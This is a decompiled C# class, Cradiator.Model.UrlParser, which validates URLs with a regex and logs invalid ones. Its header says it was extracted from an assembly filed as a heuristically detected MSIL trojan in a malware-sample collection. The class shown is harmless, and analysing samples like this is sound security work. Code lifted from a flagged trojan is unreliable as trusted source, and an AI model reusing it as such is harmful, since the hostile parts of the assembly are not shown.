// Decompiled with JetBrains decompiler
// Type: Cradiator.Model.UrlParser
// Assembly: FileOptio, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0135208B-21B4-457A-BFCD-FFD93FD8BA14
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan.MSIL.Crypt.gen-c07e2154bd7603dd3a6fdf4810a799ff7d31670747236cd1d2a52be397c0676b.exe

using Cradiator.Extensions;
using log4net;
using System.Text.RegularExpressions;

namespace Cradiator.Model
{
  public class UrlParser
  {
    private static readonly ILog _log = LogManager.GetLogger(typeof (UrlParser).Name);
    private readonly string _url;

    public UrlParser(string url) => this._url = url;

    public string Url => this._url;

    public bool IsValid
    {
      get
      {
        bool isValid = this.IsDebug || Regex.IsMatch(this._url, "^((https?)://+[\\w\\d:#@%/;$()~_?\\+-=\\\\\\.&]*)");
        if (!isValid)
          UrlParser._log.WarnFormat("Skipping invalid URL: '{0}'", (object) this._url);
        return isValid;
      }
    }

    public bool IsNotValid => !this.IsValid;

    public bool IsDebug => this._url.HasValue() && this._url.ToLower().StartsWith("debug");
  }
}
